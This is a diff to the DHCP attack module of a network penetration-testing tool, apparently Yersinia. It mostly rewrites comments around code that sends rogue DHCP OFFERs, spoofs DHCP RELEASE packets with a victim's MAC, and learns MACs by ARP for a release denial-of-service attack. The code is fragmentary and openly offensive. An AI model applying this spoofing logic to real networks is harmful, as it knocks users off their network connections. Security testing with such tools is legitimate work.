@@ -331,7 +331,8 @@ dhcp_send_inform(struct attacks *attacks)
 
     return 0;
 }
-
+ // This is the code that will be executed when an OFFER DHCP packet needs to be sent
+ // This applies to Rogue server attack
 void dhcp_th_send_offer( void *arg )
 {
     struct attacks *attacks = (struct attacks *)arg ;
@@ -354,7 +355,7 @@ void dhcp_th_send_offer( void *arg )
     dhcp_th_send_offer_exit(attacks);
 }
 
-
+/* This is a cleanup and exit function for the thread code in function above*/
 void dhcp_th_send_offer_exit( struct attacks *attacks )
 {
     attack_th_exit(attacks);
@@ -482,15 +483,18 @@ dhcp_send_request(struct attacks *attacks)
     return 0;
 }
 
-
+/*
+This is the implementation for sending DHCP RELEASE packet used in the DHCP release attack
+*/
 int8_t
 dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int8_t *mac_server, u_int8_t *mac_victim) 
-{ // This bit is called when it's time to actually send the release packet, thus it also might be the cause of the packets not being sent 
+{ 
     struct dhcp_data *dhcp_data;
 
     u_int8_t mac_before_spoof[ETHER_ADDR_LEN];
 
     dhcp_data = attacks->data;
+    //setting some important parameters for packed addressing 
 
     //mac_before_spoof = dhcp_data->mac_source;
     memcpy((void *)mac_before_spoof,(void *)dhcp_data->mac_source,ETHER_ADDR_LEN);
@@ -506,13 +510,13 @@ dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int
 
     dhcp_data->op = LIBNET_DHCP_REQUEST;
     dhcp_data->flags = 0;
-    /* FIXME: libnet consistency */ // !? HUH
+    /* FIXME: libnet consistency */ 
     dhcp_data->ciaddr = htonl(ip);
 
 /*    memcpy((void *)&dhcp_data->ciaddr, (void *)&ip, 4);*/
 
     memcpy((void *)dhcp_data->chaddr, (void *)mac_victim, ETHER_ADDR_LEN);
-    //I have no clue why it starts at [2] and google is not very helpful to me rn
+   // setting of some DHCP options 
     dhcp_data->options[2] = LIBNET_DHCP_MSGRELEASE;
     dhcp_data->options[3] = LIBNET_DHCP_SERVIDENT;
     dhcp_data->options[4] = 4;
@@ -528,7 +532,7 @@ dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int
     dhcp_data->options_len = 54;
 
     // Code above is pretty much moving data from one place to another and not really doing much with it, it's all a setup for the dhcp_send_packet
-    // Let's add some error handling in here, the same way it is implemented in dhcp_send_packet
+    // Error handling was implemented in this section the same way it is implemented in dhcp_send_packet
     if (dhcp_send_packet(attacks) < 0)
     {
         //dhcp_data->mac_source = mac_before_spoof;
@@ -993,7 +997,7 @@ void dhcp_th_dos_send_release_exit( struct attacks *attacks )
     pthread_exit(NULL);
 }
 
-
+// This is the piece of code for sending ARP requests, required for learning MAC addresses during the DHCP release attack
 int8_t
 dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible that this one is broken, in a way that it creates valid, but malformed requests
 {
@@ -1038,7 +1042,7 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible th
                     lhandler,     /* libnet context */
                     0);           /* libnet id */
 
-        if (t == -1)
+        if (t == -1) // on failure clean up and return fail code
         {
             thread_libnet_error("Can't build arp header",lhandler);
             write_log(0,"Can't build arp header!");
@@ -1059,7 +1063,7 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible th
                     mac_dest,                               ethernet destination 
                     ETHERTYPE_ARP,                           protocol type 
                     lhandler);                                      libnet handle */
-        if (t == -1)
+        if (t == -1)// on failure clean up and return fail code
         {
             thread_libnet_error("Can't build ethernet header",lhandler);
             write_log(0,"Can't build ethernet header!");
@@ -1072,7 +1076,7 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible th
          */
         sent = libnet_write(lhandler);
 
-        if (sent == -1) {
+        if (sent == -1) { // on failure clean up and return fail code
             thread_libnet_error("libnet_write error", lhandler);
             write_log(0,"Libnet write erre!");
             libnet_clear_packet(lhandler);
@@ -1085,7 +1089,7 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible th
     return 0;
 }
 
-
+// This is the code for learning MAC addresses using ARP request during the DHCP Release attack
 int8_t
 dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac) //This function is most likely why the DHCP Release DOS does not work
 
@@ -1165,7 +1169,7 @@ dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac) //
     return 0;
 }
 
-
+// This is a generic function for sending specific DHCP packets using libnet
 int8_t
 dhcp_send_packet(struct attacks *attacks)
 {
@@ -1603,7 +1607,7 @@ char **dhcp_get_printable_packet( struct pcap_data *data )
     return field_values;
 }
 
-
+// A helper function
 int8_t
 dhcp_load_values(struct pcap_data *data, void *values)
 {
@@ -1759,7 +1763,7 @@ dhcp_load_values(struct pcap_data *data, void *values)
     return 0;
 }
 
-
+// function used in displaying of packet contents in the GUI
 char **
 dhcp_get_printable_store(struct term_node *node)
 {
